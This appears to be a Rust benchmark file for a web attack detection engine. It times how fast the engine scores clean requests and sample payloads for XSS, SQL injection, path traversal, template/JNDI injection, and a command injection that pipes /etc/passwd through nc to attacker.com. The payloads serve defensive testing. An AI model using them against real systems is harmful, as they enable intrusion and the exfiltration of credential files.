use criterion::BenchmarkId;
use criterion::Criterion;
use criterion::criterion_group;
use criterion::criterion_main;
use guard_core_engine::preprocessor::preprocess;
use guard_core_engine::semantic::AttackKeywords;
use guard_core_engine::semantic::AttackStructures;
use guard_core_engine::semantic::analyze;
use guard_core_engine::semantic::get_threat_score;

fn full_pipeline(content: &str, kw: &AttackKeywords, st: &AttackStructures) -> f64 {
    let preprocessed = preprocess(content, 10_000, true);
    let result = analyze(&preprocessed, kw, st);
    get_threat_score(&result)
}

fn bench_end_to_end(c: &mut Criterion) {
    let keywords = AttackKeywords::default();
    let structures = AttackStructures::default();

    let payloads: Vec<(&str, String)> = vec![
        (
            "clean_get",
            "GET /api/v1/users?page=1&limit=20 HTTP/1.1".to_owned(),
        ),
        (
            "clean_json",
            r#"{"username":"john","email":"john@example.com","age":30}"#.to_owned(),
        ),
        (
            "xss_basic",
            "<script>alert(document.cookie)</script>".to_owned(),
        ),
        (
            "xss_bypass",
            format!(
                "<scr{}ipt>al{}ert(1)</sc{}ript>",
                '\u{200B}', '\u{200C}', '\u{200D}'
            ),
        ),
        (
            "sqli_union",
            "1' OR '1'='1' UNION SELECT username, password FROM users--".to_owned(),
        ),
        (
            "sqli_encoded",
            "1' %55NION %53ELECT * FROM users WHERE '1'='1".to_owned(),
        ),
        (
            "cmd_injection",
            "test; cat /etc/passwd | nc attacker.com 9999".to_owned(),
        ),
        ("path_traversal", "../../../../../../etc/passwd".to_owned()),
        (
            "template_injection",
            "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}".to_owned(),
        ),
        (
            "double_encoded",
            "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E".to_owned(),
        ),
        (
            "oversized_payload",
            format!(
                "{}<script>alert(1)</script>{}",
                "a".repeat(5000),
                "b".repeat(5000)
            ),
        ),
        (
            "mixed_attack",
            "<script>eval('alert(1)')</script> UNION SELECT * FROM users".to_owned(),
        ),
    ];

    let mut group = c.benchmark_group("detection_engine_e2e");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("pipeline", name), payload, |b, p| {
            b.iter(|| full_pipeline(p, &keywords, &structures));
        });
    }

    group.finish();
}

fn bench_throughput(c: &mut Criterion) {
    let keywords = AttackKeywords::default();
    let structures = AttackStructures::default();

    let batch: Vec<String> = (0..100)
        .map(|i| match i % 5 {
            0 => format!("GET /api/v1/resource/{i}"),
            1 => format!("<script>alert({i})</script>"),
            2 => format!("' OR 1=1 UNION SELECT {i} FROM users--"),
            3 => format!("../../etc/passwd{i}"),
            _ => format!("normal request body {i} with some data"),
        })
        .collect();

    c.bench_function("throughput_100_mixed", |b| {
        b.iter(|| {
            batch
                .iter()
                .map(|p| full_pipeline(p, &keywords, &structures))
                .sum::<f64>()
        });
    });
}

criterion_group!(benches, bench_end_to_end, bench_throughput,);
criterion_main!(benches);
